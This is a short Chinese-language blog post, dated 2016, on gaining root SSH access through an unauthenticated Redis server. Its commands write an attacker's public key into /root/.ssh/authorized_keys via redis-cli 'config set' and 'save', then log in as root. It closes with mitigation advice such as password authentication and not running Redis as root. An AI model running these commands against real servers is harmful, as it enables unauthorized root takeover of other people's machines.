---
title: 利用Redis未授权访问配合SSHkey文件提权
date: 2016-08-23 09:12:55
categories:
- Internet
tags: 
- Redis
---
## 一.漏洞概述
Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。

## 二.漏洞分析与利用
#### 1. 先创建秘钥文件
```bash
ssh-keygen –t rsa
```
#### 2. 利用空口令登录redis
```bash
redis-cli -h xxx.xxx.xxx.xxx

config set dir /root/.ssh
config get dir
config set dbfilename authorized_keys
set test "\n\n\nssh-rsa  key_pub\n\n\n\n"
save
```
其中key_pub为生成的公钥,即可将公钥保存在远端服务器,使得登录时不需要输入账号与密码.

#### 3. 利用私钥登录root@xxx.xxx.xxx.xxx
```bash
ssh -i id_rsa root@xxx.xxx.xxx.xxx
```

## 三.漏洞修补方法
1. 禁止使用 root 权限启动 redis 服务；
2. 对 redis 访问启用密码认证，并且添加 IP 访问限制；
3. 尽可能不对公网直接开放 SSH 服务。

## 四.参考
- [zoomeye](https://www.zoomeye.org/)
- [Redis 未授权访问配合 SSH key 文件利用分析](http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/)
- [Redis未授权访问导致可远程获得服务器权限](http://www.2cto.com/Article/201511/449779.html)
        